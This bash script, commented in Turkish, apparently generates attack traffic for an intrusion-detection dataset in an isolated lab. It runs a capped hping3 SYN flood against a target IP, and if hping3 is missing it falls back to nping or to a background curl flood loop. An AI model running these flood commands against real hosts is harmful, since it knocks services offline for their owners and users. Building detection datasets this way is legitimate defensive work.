#!/usr/bin/env bash
# 04 dos — hping3 SYN taşkını, KISA ve SINIRLI (sadece izole ağ).
# Akış patlamasını önlemek için paket sayısı sınırlı (-c): her paket farklı
# kaynak portu → ~COUNT akış. Bu, dataseti dengede tutar ("sınırlı DoS").
set -uo pipefail
VIC="${1:-10.10.10.30}"; DUR="${2:-8}"
COUNT="${3:-2500}"          # ~2500 SYN → ~2500 akış (dengeli); artırmak için değiştir
echo "[dos] hping3 -S -p 80 -c $COUNT (hızlı, sınırlı) $VIC"
if command -v hping3 >/dev/null 2>&1; then
  # -i u200 ≈ 5000 pps; timeout güvenlik sınırı. timeout'un 124 çıkışı normaldir.
  sudo -n timeout "$DUR" hping3 -S -p 80 -c "$COUNT" -i u200 "$VIC" >/dev/null 2>&1
  rc=$?
  case $rc in 0|124) echo "[dos] hping3 tamam (rc=$rc)";; *) echo "[dos] hping3 rc=$rc";; esac
elif command -v nping >/dev/null 2>&1; then
  sudo -n timeout "$DUR" nping --tcp -p 80 --rate 3000 -c "$COUNT" "$VIC" >/dev/null 2>&1 || true
else
  echo "[dos] hping3/nping yok → curl seli (yedek)"
  timeout "$DUR" bash -c "while :; do curl -s -o /dev/null --max-time 1 http://$VIC/ & done" 2>/dev/null || true
fi
echo "[dos] done"
